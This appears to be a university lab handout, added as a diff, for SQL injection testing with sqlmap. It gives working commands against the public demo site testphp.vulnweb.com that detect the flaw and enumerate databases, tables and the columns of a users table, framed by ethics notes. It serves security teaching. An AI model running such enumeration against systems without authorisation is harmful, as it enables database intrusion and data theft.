@@ -1,0 +1,33 @@
+=== exp8.txt ===
+SL - 2025  |  Experiment 8
+Title: SQL Injection Testing with sqlmap (Ubuntu) — Demo Targets Only
+
+ETHICS
+- Use only demo/vulnerable sites or your own lab apps (e.g., DVWA, testphp.vulnweb.com). Never attack production without permission.
+
+INSTALL
+sudo apt-get update && sudo apt-get install -y sqlmap
+
+1) Quick help
+sqlmap -h
+
+2) Check a demo URL
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
+
+3) Enumerate databases (demo target)
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+
+4) List tables in a demo DB
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
+
+5) List columns
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
+
+6) Ethical behavior
+- Avoid extracting or publishing sensitive PII unless your course explicitly requires and authorizes it.
+- Prefer screenshots/notes that show technique rather than recording actual user data.
+
+FIREFOX TIP
+- Use Firefox to examine request parameters and copy exact URL/GET parameters into sqlmap.
+
+END exp8.txt
